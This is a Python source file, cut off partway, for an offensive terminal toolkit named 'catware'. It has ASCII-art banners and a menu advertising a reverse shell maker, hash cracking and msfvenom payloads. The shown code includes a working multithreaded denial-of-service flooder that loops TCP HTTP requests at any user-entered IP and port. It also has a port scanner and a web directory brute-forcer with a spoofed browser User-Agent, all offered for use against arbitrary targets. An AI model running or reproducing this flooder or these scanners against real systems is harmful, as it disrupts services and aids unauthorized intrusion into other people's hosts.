import hashlib
import os
import os.path
import platform
import random
import re
import socket
import queue
import string
import subprocess
import sys
import threading
import time
from datetime import datetime
from os import system as command
from time import sleep as wait
import requests
command("clear")
def slow_print(text, delay=0.08):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()
port_banner = """
⠀⠀⠀⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠓⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀         ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠈⠓⠢⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⣫⠂⠘⠁⠀⠳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠉⠲⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⡱⠁⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢤⡀⠀⠀⠀⠀⠀⠀⠀⢀⠇⢸⠃⠀⠀⠀⠀⠀⠀⠀⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠴⠒⠂⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⠀⠒⠒⠒⠒⠒⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢎⠀⠀⢞⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢇⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⠞⠉⠉⠆⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⢁⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢹⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡴⠁⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠢⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠠⠎⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡘⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢁⡠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⢈⡢⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡔⣩⠄⠀⠀⠀⠀⠀⠀⠀ ⠜⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⢹⠌⣖⠀⠀⠀⠀
⠀⠀⠀⢸⠁⠀⠀⠀⠀⠀⠀⠘⡀⠀⠀⠀⠀⠀⠀⠀⢠⠎⡔⠁⠀⠀⠀⠤⠦⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠤⣄⣀⣀⠀⠀⠀⣀⡤⠞⠀⠀⠀⠀
⠀⠀⠀⠘⡆⠀⢀⠀⠀⠀⠀⢀⣣⠀⠀⠀⠀⠀⠀⠀⠸⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡄⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⢇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢷⡀⡇⠉⠳⢄⡀⠘⠛⢧⠀⠀⠀⠀⠀⠀⠀⠀⠉⡇⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣣⡀⠀⠀⡼⢣⠀⠀⠀⠀⠉⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⡍⠃⠀⠀⠀⠈⠙⠀⠀⠳⡀⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⠀⠒⠂⠀⠀⠀⠀⠀⠀⠀⢰⠙⠦⣄⣠⠔⠁⠉⠒⠊⠀⢨⠀⠀⠐⢤⡀⠤⠄⠚⠚⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠘⢆⠀⠀⠀⠀⠀⠘⠤⠤⠤⠀⣠⣀⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡌⠀⣀⠴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⢢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢆⡀⠀⢀⠴⠚⠉⠉⠀⠀⠀⠉⠓⠢⠤⠄⢀⣀⣇⣀⣀⣀⣀⣀⣀⠀⠠⠤⠒⠋⠁⠀⠀⠈⠈⠑⢆⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠢⣀⠀⠀⠀⠀⠀⠀⠀⢀⣈⡷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢄⠀⠀⠀⠀⠀⢾⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠒⠒⠒⠒⠈⠉⢩⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⣠⢤⣀⠃⠀⠀⠀⠀⠈⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠣⣀⡆⠀⠀⠀⠀⠀⠀⡴⢉⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⣸⠀⠀⠀⠀⢀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡀⠀⠀⠀⠀⠀⠀⡎⠉⠉⠉⡁⠅⠸⠀⠀⠀⠀⠀⠀⢠⠤⠤⠸⠀⠈⠉⠉⠁⢇⠀⢀⢠⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣀⡀⢂⣐⡴⠣⠤⠼⠔⠛⠀⠀⡄⠀⠀⢀⢠⡀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠈⠦⣸⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠲⠤⠼⠒⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
banner = """             ⣀⣠⣤⣶⣶⣶⣶⣶⣶⣶⣦⣀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⢤⣠⣶⣿⣿⡿⠿⠛⠛⠛⠛⠉⠛⠛⠛⠛⠿⣷⡦⠞⣩⣶⣸⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣾⡤⣌⠙⠻⣅⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠔⠋⢀⣾⣿⣿⠃⣇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⡟⢇⢻⣧⠄⠀⠈⢓⡢⠴⠒⠒⠒⠒⡲⠚⠁⠀⠐⣪⣿⣿⡿⡄⣿⣷⡄⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣿⣿⠟⠁⠸⡼⣿⡂⠀⠀⠈⠁⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠉⠹⣿⣧⢳⡏⠹⣷⡄⠀⠀⠀⠀
⠀⠀⣰⣿⡿⠃⠀⠀⠀⢧⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠇⡸⠀⠀⠘⢿⣦⣄⠀⠀
⠀⢰⣿⣿⠃⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠀⠀⠀⠀⠀⠀⠰⡇⠀⠀⠀⠈⣿⣿⣆⠀
⠀⣿⣿⡇⠀⠀⠀⠀⢰⠇⠀⢺⡇⣄⠀⠀⠀⠀⣤⣶⣀⣿⠃⠀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⠀⠸⣿⣿⡀
⢸⣿⣿⠀⠀⠀⠀⠀⢽⠀⢀⡈⠉⢁⣀⣀⠀⠀⠀⠉⣉⠁⠀⠀⠀⣀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⣿⣿⡇
⢸⣿⡟⠀⠀⠀⠠⠀⠈⢧⡀⠀⠀⠀⠹⠁⠀⠀⠀⠀⠀⠀⠠⢀⠀⠀⠀⠀⠀⢼⠁⠀⠀⠀⠀⠀⢹⣿⡇
⢸⣿⣿⠀⠀⠀⠀⠀⠠⠀⠙⢦⣀⠠⠊⠉⠂⠄⠀⠀⠀⠈⠀⠀⠀⣀⣤⣤⡾⠘⡆⠀⠀⠀⠀⠀⣾⣿⡇
⠘⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⢠⠜⠳⣤⡀⠀⠀⣀⣤⡤⣶⣾⣿⣿⣿⠟⠁⠀⠀⡸⢦⣄⠀⠀⢀⣿⣿⠇
 ⢿⣿⣧⠀⠀⠀⠀⠀⣠⣤⠞⠀⠀⠀⠙⠁⠙⠉⠀⠀⠸⣛⡿⠉⠀⠀⠀⢀⡜⠀⠀⠈⠙⠢⣼⣿⡿⠀
⠀⠈⣿⣿⣆⠀⠀⢰⠋⠡⡇⠀⡀⣀⣤⢢⣤⣤⣀⠀⠀⣾⠟⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⠀⣰⣿⣿⠁⠀
⠀⠀⠈⢿⣿⣧⣀⡇⠀⡖⠁⢠⣿⣿⢣⠛⣿⣿⣿⣷⠞⠁⠀⠀⠈⠫⡉⠁⠀⠀⠀⠀⢀⣼⣿⠿⠃⠀⠀
⠀⠀⠀⠈⠻⣿⣿⣇⡀⡇⠀⢸⣿⡟⣾⣿⣿⣿⣿⠋⠀⠀⠀⢀⡠⠊⠁⠀⠀⠀⢀⣠⣿⠏⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠈⠻⣿⣿⣦⣀⢸⣿⢻⠛⣿⣿⡿⠁⠀⠀⣀⠔⠉⠀⠀⠀⠀⣀⣴⡿⠟⠁⠀⠀⠀⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣼⣿⣿⣟⠀⠀⡠⠊⠀⣀⣀⣠⣴⣶⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⣿⣿⣿⣿⣶⣶⣷⣶⣶⡿⠿⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-fancy cat :3- ---catware--- """
dosser = """
⣴⡿⠶⠀⠀⠀⣦⣀⣴⠀⠀⠀⠀
⣿⡄⠀⠀⣠⣾⠛⣿⠛⣷⠀⠿⣦
⠙⣷⣦⣾⣿⣿⣿⣿⣿⠟⠀⣴⣿
⠀⣸⣿⣿⣿⣿⣿⣿⣿⣾⠿⠋⠁
⠀⣿⣿⣿⠿⡿⣿⣿⡿⠀⠀⠀⠀
⢸⣿⡋⠀⠀⠀⢹⣿⡇⠀⠀⠀⠀
⣿⡟⠀⠀⠀⠀⠀⢿⡇⠀⠀⠀⠀
⠉⠁⠀⠀⠀⠀⠀⠸⠇⠀⠀⠀⠀
"""
revbanner = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠁⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡃⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡃⠀⠀⠀⠀⠀⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠈⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠠⠖⠆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠁⠀⠀⡃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠆⠁⠀⠀⠀⠀⠅⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠄⠈⠉⠉⠉⠉⠉⠉⠉⠉⣹⠉⠢⡀⠀⡠⠄⠊⠀⠀⠀⠀⠀⠀⠀⡁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠕⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄
⠀⠀⠀⠀⠀⢀⡄⠎⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⢀⠆
⠀⠀⠀⡠⠈⠁⠀⠀⠀⠀⠀⠀⠀⣀⠬⣭⣁⡑⠒⢶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢏⠀
⠀⠀⠀⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⢸⠍⢷⡀⠣⢆⠈⠂⠀⠀⠀⠀⠀⠀⠀⢀⢎⡈⠀⠈⣀⠁⠄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡂
⠐⠄⠀⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡈⠆⡉⢂⠐⠈⡂⢢⠀⠀⠀⠀⠀⠀⡂⠀⠈⡟⠿⡣⠋⠒⣄⡀⠇⠄⠀⠀⠀⠀⠀⠀⠀⠀⠣
⠀⠀⠀⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠙⢤⣱⣡⠃⢨⠀⠀⠀⠀⠀⠀⠁⠢⠖⠀⠀⠐⠋⠶⢤⡵⠒⢹⠁⠀⠀⠀⠀⠀⠀⠀⢘
⠀⠀⠀⢐⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠣⣈⡣⠯⠍⠈⢷⠦⣀⠀⠀⠀⠀⠀⠀⡌⠆⠁⡡⠁⠉⠉⡋⠉⠫⠀⠀⠖⠁⠈⠀⠉⠀⠈
⠄⠠⠀⠚⡗⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⠀⠀⠈⡹⠀⠀⠀⠉⠉⠀⠁⠂⠂⠂⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸
⠀⠀⠀⠀⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⡀⠀⠀⠀⠀⠀⠀⠈⠣⣄⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⡀⠀⠀⠀⡨
⠀⠀⠀⠀⠀⠳⢴⡐⠀⡀⠀⠀⠀⠀⠀⠀⡗⢄⠀⠀⠀⠀⠀⢸⢣⠃⡎⠀⠀⠀⠤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠂⡀⢀⠂
⠀⠀⠀⠠⠈⠀⠀⠀⠉⠓⠱⠒⡤⡤⢀⠀⠐⡄⠁⠄⡀⠀⠀⠀⢯⡎⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⡸⠡⠀
⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠑⢭⡋⠍⡓⠭⣈⠓⠢⣔⡎⠓⡀⠀⠀⠀⡰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⢤⣰⠊⠀⠀⠀
⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠤⣀⠈⠂⠄⠀⠀⠀⠀⠁⠓⠒⠾⡁⡀⠀⠀⠀⠀⠀⠀⡠⠐⠐⠊⠀⡠⠎⢠⠇⠀⠄⠀
"""
zbanner = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠙⣄⡂⠀⠀⠀⠀⠀⠀⠠⢄⠘⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠄⠈⠳⣄⡤⠤⠤⣴⡍⣰⠋⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠀⠀⠀⠁⠄⡁⠀⠀⠀⠇⠉⠁⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠁⠠⢼⣯⡇⠀⠀⠀⠀⣶⣶⡀⠀⠀⠀⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠁⠁⠀⠈⠀⠀⠐⠀⠀⠄⡇⠄⠄⠀⠉⢁⠁⣀⣀⡀⠘⠛⠇⠐⠂⠄⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡀⢀⠀⠠⠀⠓⣅⠀⠀⠀⠈⠓⡖⠺⢄⣀⣀⡄⠀⠦⠀⢀⣠⠃⠁⠀⠀⠀⠂⠀⠀⠀⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠤⠭⠷⠖⠀⠀⠹⠤⠴⠃⠀⠀⠠⣤⣤⡒⠉⠁⠀⠀⠂⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡠⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠑⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣁⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡶⠦⣀⡀⠀⠀⢀⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣘⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⠀⠀⠀⠀⠀⠀⠀⠀⠀⣣⠀"""
optionz = """
compile -> compile code
crack -> crack a hash
rev -> reverse shell maker
ssh -> interactiv ssher
dos -> stupid basic dos attack
help -> commands you can use
scan -> port scan
dirf -> web directory bruteforce
req -> request maker
hashr -> hash text
msfv -> msfveom payload maker
clear -> clear screen
exit -> exit
"""
slow_print(banner, 0.002)
wait(0.3)
def portscanner():
    command("clear")
    print(port_banner)
    target_ip = input("Enter the IP or DOMAIN to scan: ")
    ports_2_scan = [21, 22, 80, 443, 3306, 4444, 80, 8080, 445]
    print(f"Scanning IP : {target_ip}")
    for port in ports_2_scan:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                print(f"Port {port} is OPEN yippi :D ")
            else:
                print(f"Port {port} is CLOSED :( ")
            sock.close()
        except Exception as e:
            print(f"Error scanning port {port}: {e}")
    input("press enter to go back ")
    command("clear")
    slow_print(banner, 0.002)
    wait(0.3)
def req():
    api = input("enter api : ")
    data = input("enter json api data : ")
    try:
        response = requests.post(api, json=data)
        print(response.status_code)
    except Exception as err:
        print(f"error : {err}")
    input("press enter to go back ")
    command("clear")
    slow_print(banner, 0.002)
    wait(0.3)
def dos():
    print(dosser)
    print("=== DOS TOOL ===\n")

    def attack(target_ip, target_port):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.sendto(
                    ("GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n").encode(),
                    (target_ip, target_port),
                )
                s.close()
            except:
                pass
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    threads = int(input("Enter number of threads: "))
    print(f"\n[+] Target: {target_ip}:{target_port}")
    print(f"[+] Threads: {threads}")
    print("[+] Starting attack... Press Ctrl+C to stop\n")
    for i in range(threads):
        thread = threading.Thread(target=attack, args=(target_ip, target_port))
        thread.start()
        time.sleep(0.1)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped.")
    input("press enter to go back ")
    command("clear")
    slow_print(banner, 0.002)
    wait(0.3)
def stl():
    print("boo!")
def hashr():
    algorithms = {
        "MD5": hashlib.md5,
        "SHA1": hashlib.sha1,
        "SHA256": hashlib.sha256,
        "SHA512": hashlib.sha512,
    }
    text = input("Enter text: ")
    algorithm = input("Choose MD5, SHA1, SHA256, or SHA512: ").upper()

    if algorithm not in algorithms:
        print("Unsupported algorithm.")
    else:
        digest = algorithms[algorithm](text.encode("utf-8")).hexdigest()
        print(f"{algorithm}: {digest}")

def dirf():
    os.system("clear" if os.name != "nt" else "cls")
    AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    EXTENSIONS = [".php", ".bak", ".orig", ".inc", ".html"]
    THREADS = 50
    banner = r"""
                  _        __           _    
    __      _____| |__    / _|_/\__ ___| | __
    \ \ /\ / / _ \ '_ \  | |_\    // __| |/ /
     \ V  V /  __/ |_) | |  _/_  _\ (__|   < 
      \_/\_/ \___|_.__/  |_|   \/  \___|_|\_\ 
    --- catware ---
    """
    print(banner)
    TARGET = input("Enter target site (ex: https://example.com): ").strip().rstrip("/")
    WORDLIST = input("Enter wordlist path: ").strip()
    def build_wordlist(resume=None):
        words = queue.Queue()
        with open(WORDLIST, "r", encoding="utf-8", errors="ignore") as f:
            raw_words = [line.strip() for line in f if line.strip()]
        found_resume = resume is None
        for word in raw_words:
            if not found_resume:
                if word == resume:
                    found_resume = True
                    print(f"[+] Resuming from: {resume}")
                continue
            if "." in word:
                words.put(f"/{word}")
            else:
                words.put(f"/{word}/")

            for ext in EXTENSIONS:
                words.put(f"/{word}{ext}")
        return words
    def worker(word_queue):
        session = requests.Session()
        session.headers.update({"User-Agent": AGENT})
        while True:
            try:
                path = word_queue.get_nowait()
